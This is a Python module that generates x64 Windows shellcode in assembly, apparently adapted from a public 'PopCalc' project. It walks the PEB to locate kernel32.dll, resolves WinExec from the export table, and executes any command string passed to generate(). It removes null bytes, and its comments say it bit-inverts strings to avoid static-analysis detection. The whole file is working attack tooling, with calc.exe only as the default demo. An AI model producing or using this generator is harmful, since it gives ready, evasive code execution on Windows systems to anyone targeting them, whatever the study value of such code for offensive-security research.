# Reference: https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
from utils import convert

def start() -> str:
    return """
xor rdi, rdi            ; RDI = 0x0
mul rdi                 ; RAX&RDX = 0x0
mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
mov rbx, [rbx+0x18]     ; RBX = Address_of_LDR
mov rbx, [rbx+0x20]     ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
mov rbx, [rbx]          ; RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
mov rbx, [rbx]          ; RBX = 3rd entry in InitOrderModuleList / kernel32.dll
mov rbx, [rbx+0x20]     ; RBX = &kernel32.dll ( Base Address of kernel32.dll)
mov r8, rbx             ; RBX & R8 = &kernel32.dll
"""

def get_exporttable_addr() -> str:
    return """
; Get kernel32.dll ExportTable Address
mov ebx, [rbx+0x3C]     ; RBX = Offset NewEXEHeader
add rbx, r8             ; RBX = &kernel32.dll + Offset NewEXEHeader = &NewEXEHeader
xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8            ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8             ; RDX = &kernel32.dll + RVA ExportTable = &ExportTable
"""

def get_address_table() -> str:
    return """
; Get &AddressTable from Kernel32.dll ExportTable
xor r10, r10
mov r10d, [rdx+0x1C]    ; RDI = RVA AddressTable
add r10, r8             ; R10 = &AddressTable
"""

def get_namepointer_table() -> str:
    return """
; Get &NamePointerTable from Kernel32.dll ExportTable
xor r11, r11
mov r11d, [rdx+0x20]    ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
add r11, r8             ; R11 = &NamePointerTable (Memory Address of Kernel32.dll Export NamePointerTable)
"""

def get_ordinal_table() -> str:
    return """
; Get &OrdinalTable from Kernel32.dll ExportTable
xor r12, r12
mov r12d, [rdx+0x24]    ; R12 = RVA  OrdinalTable
add r12, r8             ; R12 = &OrdinalTable
"""

def jump_to_apis() -> str:
    return "jmp short apis"

def def_getapiaddr() -> str:
    return """
; Get the address of the API from the Kernel32.dll ExportTable
getapiaddr:
pop rbx                     ; save the return address for ret 2 caller after API address is found
pop rcx                     ; Get the string length counter from stack
xor rax, rax                ; Setup Counter for resolving the API Address after finding the name string
mov rdx, rsp                ; RDX = Address of API Name String to match on the Stack 
push rcx                    ; push the string length counter to stack
"""

def def_loop() -> str:
    return """
loop:
mov rcx, [rsp]              ; reset the string length counter from the stack
xor rdi,rdi                 ; Clear RDI for setting up string name retrieval
mov edi, [r11+rax*4]        ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
add rdi, r8                 ; RDI = &NameString    = RVA NameString + &kernel32.dll
mov rsi, rdx                ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
repe cmpsb                  ; Compare strings at RDI & RSI
je resolveaddr              ; If match then we found the API string. Now we need to find the Address of the API
"""

def def_incloop() -> str:
    return """
incloop:
inc rax
jmp short loop
"""

def def_resolveaddr() -> str:
    return """
; Find the address of GetProcAddress by using the last value of the Counter
resolveaddr:
pop rcx                     ; remove string length counter from top of stack
mov ax, [r12+rax*2]         ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of kernel32.<API>
mov eax, [r10+rax*4]        ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
add rax, r8                 ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel32.dll BaseAddress
push rbx                    ; place the return address from the api string call back on the top of the stack
ret                         ; return to API caller
"""

def push_str_arg(hexarr) -> str:
    asm = "push rax ; Null terminate string on stack"

    for h in hexarr:
        asm += f"""
mov rax, {h}    ; not (reverse the bits) to avoid detection when static analysis
not rax
push rax        ; RSP = "calc.exe",0x0
"""
        
    asm += "mov rcx, rsp"
    return asm

def def_api() -> str:
    return """
apis:                       ; API Names to resolve addresses
; WinExec | String length : 7
xor rcx, rcx
add cl, 0x7                 ; String length for compare string
mov rax, 0x9C9A87BA9196A80F ; not (reverse the bits) 0x9C9A87BA9196A80F = 0xF0,WinExec
not rax
shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
push rax
push rcx                    ; push the string length counter to stack
call getapiaddr             ; Get the address of the API from Kernel32.dll ExportTable
mov r14, rax                ; R14 = Kernel32.WinExec Address
"""

def call_api(hexarr) -> str:
    asm = f"""
; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
; );
xor rcx, rcx
mul rcx                     ; RAX & RDX & RCX = 0x0
"""
    
    asm += push_str_arg(hexarr)

    # Push remaining argument
    asm += """
inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
call r14                    ; Call WinExec("calc.exe", SW_HIDE)
"""

    return asm

def generate(cmd: str) -> str:
    # cmd_hexarr = ["0x9A879AD19C939E9C"] # calc.exe
    cmd_hexarr = convert.str2hex(cmd, True)
    print(cmd_hexarr)

    asm = ""
    asm += start()
    asm += get_exporttable_addr()
    asm += get_address_table()
    asm += get_namepointer_table()
    asm += get_ordinal_table()
    asm += jump_to_apis()
    asm += def_getapiaddr()
    asm += def_loop()
    asm += def_incloop()
    asm += def_resolveaddr()
    asm += def_api()
    asm += call_api(cmd_hexarr)
    return asm
